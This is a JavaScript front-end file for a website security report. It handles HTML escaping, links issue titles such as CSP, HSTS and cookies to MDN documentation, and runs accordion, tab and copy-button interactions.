function escapeSecurityHtml(text) {
  if (text == null) return '';
  return String(text)
    .replace(/&/g, '&amp;')
    .replace(/</g, '&lt;')
    .replace(/>/g, '&gt;')
    .replace(/"/g, '&quot;')
    .replace(/'/g, '&#39;');
}

// Get contextual documentation URL based on the security issue
function getSecurityDocsUrl(category, title) {
  const titleLower = (title || '').toLowerCase();

  // Specific documentation links for common issues
  if (titleLower.includes('content security policy') || titleLower.includes('csp')) {
    return 'https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP';
  }
  if (titleLower.includes('strict transport') || titleLower.includes('hsts')) {
    return 'https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Strict-Transport-Security';
  }
  if (titleLower.includes('clickjacking') || titleLower.includes('x-frame')) {
    return 'https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Frame-Options';
  }
  if (titleLower.includes('mime') || titleLower.includes('x-content-type')) {
    return 'https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Content-Type-Options';
  }
  if (titleLower.includes('cookie')) {
    return 'https://developer.mozilla.org/en-US/docs/Web/HTTP/Cookies';
  }
  if (titleLower.includes('subresource') || titleLower.includes('integrity') || titleLower.includes('sri')) {
    return 'https://developer.mozilla.org/en-US/docs/Web/Security/Subresource_Integrity';
  }
  if (titleLower.includes('https') || titleLower.includes('ssl') || titleLower.includes('tls')) {
    return 'https://developer.mozilla.org/en-US/docs/Web/Security/Transport_Layer_Security';
  }

  // Category-based fallbacks
  if (category === 'Security Headers') {
    return 'https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers#security';
  }
  if (category === 'SSL/TLS') {
    return 'https://developer.mozilla.org/en-US/docs/Web/Security/Transport_Layer_Security';
  }
  if (category === 'Cookies') {
    return 'https://developer.mozilla.org/en-US/docs/Web/HTTP/Cookies';
  }

  // Default fallback
  return 'https://developer.mozilla.org/en-US/docs/Web/Security';
}

// Accordion toggle function
function toggleSecurityFixAccordion(accordionId) {
  console.log('[SecurityFixes] Toggle accordion:', accordionId);
  const accordion = document.querySelector(`[data-fix-id="${accordionId}"]`);
  const content = document.getElementById(`${accordionId}-content`);

  if (!accordion || !content) {
    console.error('[SecurityFixes] Accordion not found:', accordionId);
    return;
  }

  const isExpanded = accordion.classList.contains('expanded');

  if (isExpanded) {
    accordion.classList.remove('expanded');
    content.style.maxHeight = '0';
  } else {
    accordion.classList.add('expanded');
    content.style.maxHeight = content.scrollHeight + 'px';
    setTimeout(() => {
      content.style.maxHeight = content.scrollHeight + 'px';
    }, 50);
  }
}

// Event delegation for security fix accordions (more reliable than inline onclick)
document.addEventListener('click', function(e) {
  // Handle accordion header clicks via data-action
  const toggleAccordion = e.target.closest('[data-action="toggle-security-accordion"]');
  if (toggleAccordion) {
    const accordionId = toggleAccordion.getAttribute('data-accordion-id');
    if (accordionId) {
      e.preventDefault();
      e.stopPropagation();
      toggleSecurityFixAccordion(accordionId);
    }
    return;
  }

  // Fallback: Handle accordion header clicks via class
  const header = e.target.closest('.fix-header');
  if (header && !header.hasAttribute('data-action')) {
    const accordion = header.closest('.fix-accordion');
    if (accordion) {
      const accordionId = accordion.getAttribute('data-fix-id');
      if (accordionId) {
        toggleSecurityFixAccordion(accordionId);
      }
    }
    return;
  }

  // Handle tab button clicks via data-action
  const switchTab = e.target.closest('[data-action="switch-security-tab"]');
  if (switchTab) {
    const accordionId = switchTab.getAttribute('data-accordion-id');
    const tabName = switchTab.getAttribute('data-tab');
    if (accordionId && tabName) {
      e.preventDefault();
      e.stopPropagation();
      switchSecurityFixTab(accordionId, tabName);
    }
    return;
  }

  // Fallback: Handle tab button clicks via class
  const tabButton = e.target.closest('.fix-tab');
  if (tabButton && !tabButton.hasAttribute('data-action')) {
    const accordion = tabButton.closest('.fix-accordion');
    if (accordion) {
      const accordionId = accordion.getAttribute('data-fix-id');
      const tabName = tabButton.getAttribute('data-tab') || 'summary';
      switchSecurityFixTab(accordionId, tabName);
    }
    return;
  }

  // Handle copy button clicks via data-action
  const copyButton = e.target.closest('[data-action="copy-security-code"]');
  if (copyButton) {
    const codeId = copyButton.getAttribute('data-code-id');
    if (codeId) {
      e.preventDefault();
      e.stopPropagation();
      copySecurityCode(codeId);
    }
    return;
  }

  // Handle action buttons (Security Docs, Test Headers)
  const actionBtn = e.target.closest('.fix-btn');
  if (actionBtn) {
    const btnText = actionBtn.textContent.toLowerCase();
    if (btnText.includes('security docs') || btnText.includes('docs')) {
      window.open('https://developer.mozilla.org/en-US/docs/Web/Security', '_blank');
    } else if (btnText.includes('test headers')) {
      window.open('https://securityheaders.com/', '_blank');
    }
    return;
  }
});

// Tab switching function
function switchSecurityFixTab(accordionId, tabName) {
  const accordion = document.querySelector(`[data-fix-id="${accordionId}"]`);
  if (!accordion) return;

  const tabs = accordion.querySelectorAll('.fix-tab');
  const contents = accordion.querySelectorAll('.fix-tab-content');

  tabs.forEach(tab => tab.classList.remove('active'));
  contents.forEach(content => content.classList.remove('active'));

  const activeTab = Array.from(tabs).find(tab => tab.getAttribute('data-tab') === tabName);
  const activeContent = document.getElementById(`${accordionId}-${tabName}`);

  if (activeTab) activeTab.classList.add('active');
  if (activeContent) activeContent.classList.add('active');

  const content = document.getElementById(`${accordionId}-content`);
  if (content && accordion.classList.contains('expanded')) {
    setTimeout(() => {
      content.style.maxHeight = content.scrollHeight + 'px';
    }, 50);
  }
}

// Copy code function
function copySecurityCode(elementId) {
  const codeElement = document.getElementById(elementId);
  if (!codeElement) return;

  const text = codeElement.textContent;

  navigator.clipboard.writeText(text).then(() => {
    const button = event.target;
    const originalText = button.textContent;
    button.textContent = '✓ ' + t('reports.security.securityFixes.copied', 'Copied!');
    button.style.background = 'rgba(34, 197, 94, 0.2)';
    button.style.borderColor = '#22c55e';
    button.style.color = '#22c55e';

    setTimeout(() => {
      button.textContent = originalText;
      button.style.background = '';
      button.style.borderColor = '';
      button.style.color = '';
    }, 2000);
  }).catch(err => {
    console.error('Failed to copy:', err);
  });
}

// Make functions globally available
window.toggleSecurityFixAccordion = toggleSecurityFixAccordion;
window.switchSecurityFixTab = switchSecurityFixTab;
window.copySecurityCode = copySecurityCode;
window.renderSecurityFixes = renderSecurityFixes;
